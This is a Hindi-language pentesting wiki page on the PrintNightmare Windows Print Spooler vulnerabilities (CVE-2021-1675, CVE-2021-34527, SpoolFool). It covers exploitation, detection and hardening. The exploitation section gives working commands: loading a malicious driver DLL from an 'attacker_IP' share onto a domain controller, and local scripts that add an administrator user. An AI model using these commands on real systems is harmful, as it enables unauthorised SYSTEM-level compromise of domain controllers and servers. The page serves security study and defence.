# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare एक परिवार के कमजोरियों का सामूहिक नाम है जो Windows **Print Spooler** सेवा में हैं, जो **SYSTEM के रूप में मनमाना कोड निष्पादन** की अनुमति देते हैं और, जब स्पूलर RPC के माध्यम से पहुंच योग्य होता है, तो **डोमेन नियंत्रकों और फ़ाइल सर्वरों पर दूरस्थ कोड निष्पादन (RCE)** की अनुमति देते हैं। सबसे अधिक शोषित CVEs हैं **CVE-2021-1675** (शुरुआत में LPE के रूप में वर्गीकृत) और **CVE-2021-34527** (पूर्ण RCE)। इसके बाद के मुद्दे जैसे **CVE-2021-34481 (“Point & Print”)** और **CVE-2022-21999 (“SpoolFool”)** यह साबित करते हैं कि हमले की सतह अभी भी बंद होने से बहुत दूर है।

---

## 1. कमजोर घटक और CVEs

| वर्ष | CVE | संक्षिप्त नाम | प्राइमिटिव | नोट्स |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|जून 2021 CU में पैच किया गया लेकिन CVE-2021-34527 द्वारा बायपास किया गया|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx प्रमाणित उपयोगकर्ताओं को एक दूरस्थ शेयर से एक ड्राइवर DLL लोड करने की अनुमति देता है|
|2021|CVE-2021-34481|“Point & Print”|LPE|गैर-प्रशासक उपयोगकर्ताओं द्वारा असाइन किए गए ड्राइवर की स्थापना|
|2022|CVE-2022-21999|“SpoolFool”|LPE|मनमाना निर्देशिका निर्माण → DLL प्लांटिंग – 2021 के पैच के बाद काम करता है|

इनमें से सभी **MS-RPRN / MS-PAR RPC विधियों** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) या **Point & Print** के भीतर विश्वास संबंधों का दुरुपयोग करते हैं।

## 2. शोषण तकनीकें

### 2.1 दूरस्थ डोमेन नियंत्रक समझौता (CVE-2021-34527)

एक प्रमाणित लेकिन **गैर-विशिष्ट** डोमेन उपयोगकर्ता एक दूरस्थ स्पूलर (अक्सर DC) पर **NT AUTHORITY\SYSTEM** के रूप में मनमाने DLL चला सकता है:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
लोकप्रिय PoCs में **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) और बेंजामिन डेल्पी के `misc::printnightmare / lsa::addsid` मॉड्यूल शामिल हैं **mimikatz** में।

### 2.2 स्थानीय विशेषाधिकार वृद्धि (कोई भी समर्थित Windows, 2021-2024)

समान API को **स्थानीय** रूप से `C:\Windows\System32\spool\drivers\x64\3\` से एक ड्राइवर लोड करने के लिए कॉल किया जा सकता है और SYSTEM विशेषाधिकार प्राप्त किया जा सकता है:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – 2021 के फिक्स को बायपास करना

Microsoft के 2021 के पैच ने दूरस्थ ड्राइवर लोडिंग को ब्लॉक कर दिया लेकिन **निर्देशिका अनुमतियों को मजबूत नहीं किया**। SpoolFool `SpoolDirectory` पैरामीटर का दुरुपयोग करता है ताकि `C:\Windows\System32\spool\drivers\` के तहत एक मनमाना निर्देशिका बनाई जा सके, एक पेलोड DLL गिराता है, और स्पूलर को इसे लोड करने के लिए मजबूर करता है:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> यह एक्सप्लॉइट पूरी तरह से पैच किए गए Windows 7 → Windows 11 और Server 2012R2 → 2022 पर फरवरी 2022 अपडेट से पहले काम करता है

---

## 3. पहचान और शिकार

* **इवेंट लॉग** – *Microsoft-Windows-PrintService/Operational* और *Admin* चैनल सक्षम करें और **इवेंट ID 808** “प्रिंट स्पूलर प्लग-इन मॉड्यूल लोड करने में विफल” या **RpcAddPrinterDriverEx** संदेशों के लिए देखें।
* **Sysmon** – `इवेंट ID 7` (छवि लोड की गई) या `11/23` (फाइल लिखें/हटाएं) `C:\Windows\System32\spool\drivers\*` के अंदर जब पैरेंट प्रोसेस **spoolsv.exe** हो।
* **प्रोसेस वंश** – जब भी **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell या कोई भी असाइन किए गए बाइनरी को स्पॉन करता है, अलर्ट करें।

## 4. शमन और हार्डनिंग

1. **पैच करें!** – हर Windows होस्ट पर नवीनतम समेकित अपडेट लागू करें जिसमें Print Spooler सेवा स्थापित है।
2. **जहां आवश्यक न हो वहां स्पूलर को बंद करें**, विशेष रूप से डोमेन कंट्रोलर्स पर:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **स्थानीय प्रिंटिंग की अनुमति देते हुए दूरस्थ कनेक्शनों को ब्लॉक करें** – समूह नीति: `कंप्यूटर कॉन्फ़िगरेशन → प्रशासनिक टेम्पलेट → प्रिंटर → प्रिंट स्पूलर को क्लाइंट कनेक्शन स्वीकार करने की अनुमति दें = Disabled`।
4. **पॉइंट और प्रिंट को प्रतिबंधित करें** ताकि केवल प्रशासक ड्राइवर जोड़ सकें, रजिस्ट्री मान सेट करके:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Microsoft KB5005652 में विस्तृत मार्गदर्शन

---

## 5. संबंधित अनुसंधान / उपकरण

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) मॉड्यूल
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool एक्सप्लॉइट और लेख
* SpoolFool और अन्य स्पूलर बग के लिए 0patch माइक्रोपैच

---

**अधिक पढ़ाई (बाहरी):** 2024 वॉक-थ्रू ब्लॉग पोस्ट देखें – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## संदर्भ

* Microsoft – *KB5005652: नए पॉइंट और प्रिंट डिफ़ॉल्ट ड्राइवर स्थापना व्यवहार प्रबंधित करें*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
